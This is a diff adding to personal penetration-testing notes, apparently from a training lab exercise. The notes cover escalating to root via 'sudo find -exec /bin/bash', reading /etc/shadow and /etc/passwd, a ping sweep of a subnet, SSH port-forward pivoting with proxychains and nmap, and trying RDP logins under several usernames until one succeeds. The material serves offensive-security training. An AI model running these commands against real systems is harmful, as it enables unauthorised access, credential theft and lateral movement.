@@ -98,3 +98,29 @@ Aaron can use sudo
 sudo find . -exec /bin/bash \; -quit           (Finish up this command on monday)
 whoami    
 Results: root
+
+Situational Awareness:
+cat /etc/shadow
+cat /etc/hosts
+cat /etc/passwd
+ip a 
+ip n                                             (2 IPs found)
+for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
+ssh -S /tmp/yon yon -O cancel -D 9050                                              (Move dynamic Port Forward)
+ssh -S /tmp/kun kun -O forward -D 9050
+proxychains nmap 192.168.28.179 -T4 -Pn -vvvv -p 1-9999
+proxychains nmap 192.168.28.210 -T4 -Pn -vvvv -p 1-100                             (This one returns nothing)
+
+Try RDPing into system:
+proxychains xfreerdp /u:user2 /v:192.168.28.179                (This didn't work)
+
+ssh -S /tmp/kun kun -O forward -L 8888:192.168.28.179:3389     (Troubleshooting by making a static port forward)
+
+xfreerdp /v:127.0.0.1:8888 /u:user2
+rm .config/freerdp/known_hosts                                 (For removing host key)
+User2 - No
+User3 -No
+Lee_Roth - No
+LRoth - Yes
+
+After this you would check the box for answers
